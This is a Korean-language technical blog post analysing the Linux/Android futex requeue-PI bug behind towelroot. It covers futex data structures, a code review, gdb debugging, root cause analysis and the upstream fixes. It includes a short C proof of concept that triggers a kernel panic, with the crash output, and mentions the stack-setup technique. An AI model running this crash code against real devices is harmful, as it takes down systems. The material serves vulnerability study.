main: futex_unlock_pi() mtx...
main: ret = 0
main: sleep...
.
thread#1: resume execution, ret = 0
thread#1: return...
.
.
.
.
.
root@generic:/data/local/tmp #
```

`cond` waiter queue 에 들어가서 wait 하고 있으면서, `mtx` 로 이사갈 준비를 하고 있다. `FUTEX_CMP_REQUEUE_PI` 로 이사를 간다. mtx 가 다른 thread 에 owned 되고 있기 때문에 계속 waiter queue 에 들어가있다가, `FUTEX_UNLOCK_PI` 로 free 해지면서, lock 을 acquire 하고, execution 을 시작한다.

#### PoC

이제 pthread_cond_wait() 를 흉내낸 코드를 고쳐서, 커널 패닉을 일으켜본다. `FUTEX_WAIT_REQUEUE_PI` 와 `FUTEX_CMP_REQUEUE_PI` 를 결합. blog.nativeflow.com 을 주로 참조하였다.

``` c
static void *thread_proc(void *arg)
{
    futex_wait_requeue_pi(&cond,&mtx);
    sleep(10);
    return NULL;
}
int main(int ac,char**av)
{
    futex_lock_pi(&mtx);
    pthread_create(&t1,NULL,thread_proc,NULL);
    sleep(3);
    futex_cmp_requeue_pi(&cond,&mtx,cond);
    mtx = 0;
    futex_cmp_requeue_pi(&mtx,&mtx,mtx);
}
```

실행하면,

``` sh
z@z-linux:~/hack/fute/jni$ adb push ../libs/armeabi/fute /data/local/tmp/fute
z@z-linux:~/hack/fute/jni$ adb shell
root@generic:/ # cd /data/local/tmp
root@generic:/data/local/tmp # ./fute 
...
...
kernel BUG at kernel/rtmutex_common.h:74!
Internal error: OOps - BUG: 0 [#1] PREEMPT ARM
CPU: 0    Not tainted  (3.4.67-gea97df6-dirty #1)
PC is at rt_mutex_slowunlock+0x54/0x130
...
...
Kernel panic - not syncing: Fatal exception
```

커널 패닉이 일어난다.

`mtx = 0;` 를 빼고 requeue 를 2 번해보면 어떻게 될까? `futex_cmp_requeue_pi()` 의 `syscall` 이 -1 을 return 한다. 에러체크가 제대로 되는 셈. user level 에서 lock variable 을 un-owned 로 만들 수 있다니.

### Data structures

futex.c 의 중요한 데이터 스트럭쳐는 `futex_q`, `futex_key`, `futex_pi_state`, `futex_hash_bucket`, `rt_mutex_waiter` 가 있다.

#### futex_key

#### futex_hash_bucket

2^8 = 256 개의 hash bucket 이 있다. 이름은 `futex_queues`. 각 bucket 마다 priority list 를 달고 있는데, 접근을 sync 하기 위해 spinlock 을 사용한다.

``` c
struct futex_hash_bucket {
    spinlock_t lock;
    struct plist_head chain;
};

static struct futex_hash_bucket futex_queues[1<<FUTEX_HASHBITS];
```

futex_key 를 hashing 하여 bucket 을 찾아준다. futex_key 는 기본적으로 `uaddr` 에서 나온다.

``` c
static struct futex_hash_bucket * hash_futex(union futex_key *key)
{
    ...
    return &futex_queues[hash & ((1 << FUTEX_HASHBITS)-1)];
}
```

#### futex_pi_state

#### rt_mutex_waiter

#### futex_q

* futex_q 는 waiting tasks 1 개당 하나 할당된다. 
* `requeue_pi_key`, `rt_waiter` 는 waiting 상황에서만 필요하니까, 태스크의 kernel stack 에 할당된다. 그 task 가 waiting 하는 동안은 execution 을 하지 않을테니. 이런 가정이 문제의 시작이었다.

``` c futex_q
struct futex_q {
    struct plist_node list;

    struct task_struct *task;
    spinklock_t *lock_ptr;
    union futex_key key;
    struct futex_pi_state *pi_state;
    struct rt_mutex_waiter *rt_waiter;
    union futex_key *requeue_pi_key;
    u32 bitset;
};

static const struct futex_q futex_q_init = {
    .key = FUTEX_KEY_INIT,
    .bitset = FUTEX_BITSET_MATCH_ANY
};
```

### Code review

#### futex_wait()

futex_wait() 에서는 futex_wait_setup() -> futex_wait_queue_me() -> unqueue_me() -> out 정도의 흐름을 가진다.

futex_wait_setup() 에서는 get_futex_key() 로 uaddr 에 해당하는 futex_key structure 를 셋업한다.

####  futex_wait_queue_me()

futex_wait_queue_me() 에서는 queue_me() 를 하고, freezable_schedule() 로 wait 으로 빠진다.

queue_me() 에서는 

* futex_q 의 task_struct 에 current thread 를 세팅하고, 
* 현재 쓰레드의 normal_prio 와 100 중에서 작은걸로 futex_q 의 prio 를 세팅하고,
* 스택에 alloc 된, futex_q 를 hashbucket 에 집어 넣는다. 이미 futex_q 의 futex_key 의 hash key 들은 셋업이 된 상황.

``` c
static inline void queue_me(struct futex_q *q, struct futex_hash_bucket *hb)
    __releases(&hb->lock)
{
    int prio;

    prio = min(current->normal_prio, MAX_RT_PRIO);
    plist_node_init(&q->list,prio);
    plist_add(&q->list, &hb->chain);
    q->task = current;
    spin_unlock(&hb->lock);
}
```

#### futex_lock_pi()

* get_futex_key() 로 uaddr 에 맞는 `futex_key` 를 셋업
* `q->key` 로 hash bucket 을 계산하고, 해당 bucket 에 spinlock() 돌기
* lock 이 잡히면, futex_lock_pi_atomic() 호출

``` c kernel/spinlock.c

BUILD_LOCK_OPS(spin, raw_spinlock);

#define BUILD_LOCK_OPS(op, locktype) \
void __lockfunc __raw_##op##_lock(locktype##_t *lock) \
{ \
    for (;;) { \
        preempt_disable(); \
        if (likely(do_raw_##op##_trylock(lock))) \
            break; \
        preempt_enable(); \
        if (!(lock)->break_lock) \
            (lock)->break_lock = 1; \
        while (!raw_##op##_can_lock(lock) && (lock)->break_lock) \
            arch_##op##_relax(&lock->raw_lock); \
    } \
    (lock)->break_lock = 0; \
} \
...

```

### syscall debugging

좀 널럴한 주변부터 쳐보면서 감을 잠아야겠다.
bug 가 있는 call 들을 디버깅들어간다. 
우선 `FUTEX_WAIT` 와 `FUTEX_WAKE` 를 추적해보며 감을 잡아보련다.

geohot 의 towelroot 는 `FUTEX_LOCK_PI`, `FUTEX_WAIT_REQUEUE_PI`, `FUTEX_CMP_REQUEUE_PI` 를 사용하였다. stack 을 파고들기 위해, sendmmsg() 의 msgvec 을 이용해 stack 을 setup 했다.

futex_requeue() 를 break 잡아보았다.

    (gdb) break futex_requeue
    Breakpoint 3 at 0xc0053908: file kernel/futex.c, line 1265
    (gdb) cont
    Continuing.

    Breakpoint 3, futex_requeue (uaddr1=0xb6ea1000, flags=1, uaddr2=0xb6ea1008, nr_wake=1, nr_requeue=1, cmpval=0x0, requeue_pi=0) at kernel/futex.c:1265
    1265    {
    (gdb)

### root cause analysis

암호같은 [오리지널 리포트](https://hackerone.com/reports/13388)

그리고 Android kernel 에 들어간 fix 들. futex_lock_pi_atomic() 과 futex_requeue() 에 패치가 들어갔다.

* [futex-prevent-requeue-pi-on-same-futex.patch futex: Forbid uaddr == uaddr2 in futex_requeue(..., requeue_pi=1)](https://android.googlesource.com/kernel/common/+/248523b64c19dec8c05f1a4105a5fd529e516fbe)
* [futex: Validate atomic acquisition in futex_lock_pi_atomic()](https://android.googlesource.com/kernel/common/+/52ecbbcb920fa3d529833b1d8ad97d4575c36bd9)

일단 문제를 정리해보면,

* user space 에서 `mtx = 0` 으로 futex lock 을 해제할 수 있다는 것.
* `FUTEX_WAIT_REQUEUE_PI` 에는 `uaddr == uaddr2` 인지 체크하는 코드가 들어가있는데, 매칭되는 `FUTEX_CMP_REQUEUE_PI` 에는 저런 체크가 없어서, 콜을 하면 타고 들어가 `atomic_lock` 쪽 코드까지 무리없이 타고들어가며, lock 을 대신 (proxy) acquire 해서, 특정상황에서 thread 를 wake 시킬 수 있다는 것.
* 저 방식으로 wake 시키면 woke-up 된 thread 가 자신이 어떻게 woke-up 되었는지를 착각하여 적절한 clean-up 을 안하게되고, stack 에 dangling 된 포인터들을 남겨놓게 된다는 것.
* `futex_requeue(cond,mutex)` 가 실행될때, mutex 에 대한 lock 을 acquire 하는 path 가 2 가지가 있는데, 바로 lock 을 acquire 하는 경우와 waiter list 에 들어갔다가 lock 을 acquire 해서 깨어나는 경우. 전자의 경우는 waiter list 에 들어가지를 않았기때문에 clean-up 할 필요가 없다.
* waiter list 에서 들어갔는데, 전자로 착각하고 wake up 하면 문제. 클린업을 안하게 되버린다.


이제 어떻게 하면, stack 을 pointing 하는 dangling pointer 를 커널의 linked list 형태로 남겨놓을 수 있는지가 정리되었다. 그러면 이 버그를 이용해서, kernel read & write 를 해야한다. 따라오는데 꽤 골치가 아팠다.

### Information Leakage

### Kernel Write
